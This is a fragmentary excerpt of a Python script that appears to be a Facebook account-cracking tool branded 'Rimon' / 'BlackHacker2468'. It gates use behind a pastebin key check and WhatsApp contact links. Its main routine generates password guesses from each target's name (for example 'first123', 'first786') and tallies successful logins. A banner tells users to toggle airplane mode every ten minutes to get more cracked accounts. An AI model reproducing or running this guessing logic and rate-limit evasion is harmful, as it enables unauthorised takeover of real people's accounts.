...
def rimon_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+01621294418?text=' + tks)

        

    r1=requests.get("https://pastebin.com/raw/DznmtMim").text
    ...
    if key1 in r1:
        ...
        os.system('am start https://wa.me/+8801621294418?text=' + tks)
...
--‐----------------------------------------------
  ...
  Facebook :https://www.facebook.com/BlackHacker2468

--‐----------------------------------------------

\033[1;32mUse (Airplane) Mod Every 10 Min For Get More Ok iDz \033[1;32m
...
def R():
			...
			if key in [""]:
				...
				os.system("xdg-open https://chat.whatsapp.com/+8801621294418")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[Rimon]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0] + 'firstlast',xz[0] + 'first123',xz[0] + 'first1234',xz[0] + 'first786',xz[0] + 'first12345', xz[0] + 'first last', xz[0] + 'First Last']
                            
                            pwx = [name, xz[0]+xz[1]]

                        else:

                            pwx = [Last, xz[0] + 'firstlast',xz[0] + 'first123',xz[0] + 'first1234',xz[0] + 'first786',xz[0] + 'first12345', xz[0] + 'first last', xz[0] + 'First Last']
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/BlackHacker2468")
